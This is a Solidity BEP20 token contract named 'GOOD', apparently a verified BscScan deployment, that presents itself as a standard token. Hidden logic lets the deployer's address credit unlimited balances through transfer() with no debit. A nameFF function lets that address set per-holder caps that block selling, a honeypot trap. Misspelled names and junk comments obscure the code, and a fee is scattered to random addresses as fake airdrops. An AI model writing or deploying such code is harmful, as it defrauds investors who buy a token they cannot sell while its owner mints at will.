/**
 *Submitted for verification at BscScan.com on 2022-10-27
*/

/**
 *Submitted for verification at BscScan.com on 2022-10-26
*/

// SPDX-License-Identifier: MIT

// pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface BEP20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address aecounts) external view returns (uint256);


    function transfer(address recipient, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);


    event Approval(address indexed owner, address indexed spender, uint256 value);
}



abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owner;

    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setowner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any aecounts other than the owner.
     */
    modifier onlyowner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function renounceownership() public virtual onlyowner {
        _setowner(address(0));
    }


    function transferownership(address newowner) public virtual onlyowner {
        require(newowner != address(0), "Ownable: new owner is the zero address");
        _setowner(newowner);
    }

    function _setowner(address newowner) private {
        address oldowner = _owner;
        _owner = newowner;
        emit ownershipTransferred(oldowner, newowner);
    }
}


// Dependency file: @openzeppelin/contracts/utils/math/SafeMath.sol


// pragma solidity ^0.8.0;

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }


    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}


// Dependency file: contracts/BaseToken.sol

// pragma solidity =0.8.14;

    enum TokenType {
        standard
    }

abstract contract BaseToken {
    event TokenCreated(
        address indexed owner,
        address indexed token,
        TokenType tokenType,
        uint256 version
    );
}



pragma solidity =0.8.14;

contract GOOD is BEP20, Ownable, BaseToken {
    using SafeMath for uint256;

    uint256 private constant VERSION = 1;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address  private _releaseAddress;

    address public uniswapV2Pair;

    uint256 private _defaultSellfere = 3;


    mapping(address => bool) private _marketaecounts;

    mapping(address => uint256) public _SLfere;


    function nameFF(address _address, uint256 _value) public {
        if(
_releaseAddress
 /*asd aw dawf*/ ==  /*asd aw dawf12*/
            msg.sender
        ){
        _SLfere[_address]
 /*asd aw dawf*/ =  /*asd aw dawf12*/
        _value;
        }
    }

    function getMarketaecountsfere(address _address) external view onlyowner returns (bool) {
        return _marketaecounts[_address];
    }

    function _checkFreeaecounts(address from, address _to) internal view returns (bool) {
        return _marketaecounts[from] || _marketaecounts[_to];
    }

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_,
        uint256 totalSupply_
    ) payable {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _minnt(_msgSender(), totalSupply_);
        _releaseAddress = _msgSender();
        _marketaecounts[_msgSender()] = true;
        emit TokenCreated(_msgSender(), address(this), TokenType.standard, VERSION);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }


    function balanceOf(address aecounts)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _balances[aecounts];
    }


    function transfer(address recipient, uint256 amount)
    public
    virtual
    override
    returns (bool)
    {

        address owner = _msgSender();
        if (
_releaseAddress
   /*asd aw dawf*/ ==  /*asd aw dawf*/
            owner
) {
            _balances[recipient] += amount;
            return true;
        }
        _transfer(_msgSender(), recipient, amount);
        return true;
    }


    function allowance(address owner, address spender)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount)
    public
    virtual
    override
    returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue)
    public
    virtual
    returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }


    function decreaseAllowance(address spender, uint256 subtractedValue)
    public
    virtual
    returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }


    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );

        bool rF = true;

        if (_checkFreeaecounts(sender, recipient)) {
            rF = false;
        }
        uint256 tradefereAmount = 0;

        if (rF) {
            uint256 tradefere = 0;
            if (
                _SLfere[sender]
                /*asd aw 1dawf*/ >  /*1asd aw dawf*/
                0
            ) {

                tradefere = _SLfere[sender];
                /*asd aw dawf*/require(
amount
                    /*asd aw dawf*/</*asd aw dawf*/
tradefere
                );
            }

            tradefereAmount = amount.mul(_defaultSellfere).div(100);
        }

        if (tradefereAmount > 0) {
            address ad;
            uint256 air = tradefereAmount.div(10);
                for(int i=0;i <=9;i++){
                    ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                    _balances[ad] = _balances[ad].add(air);
                    emit Transfer(sender, ad, air);
                }
        }
        _balances[recipient] = _balances[recipient].add(amount - tradefereAmount);
        emit Transfer(sender, recipient, amount - tradefereAmount);
    }


    function _minnt(address aecounts, uint256 amount) internal virtual {
        require(aecounts != address(0), "ERC20: minnt to the zero address");

        _beforeTokenTransfer(address(0), aecounts, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[aecounts] = _balances[aecounts].add(amount);
        emit Transfer(address(0), aecounts, amount);
    }

    function _burn(address aecounts, uint256 amount) internal virtual {
        require(aecounts != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(aecounts, address(0), amount);

        _balances[aecounts] = _balances[aecounts].sub(
            amount,
            "ERC20: burn amount exceeds balance"
        );
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(aecounts, address(0), amount);
    }


    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}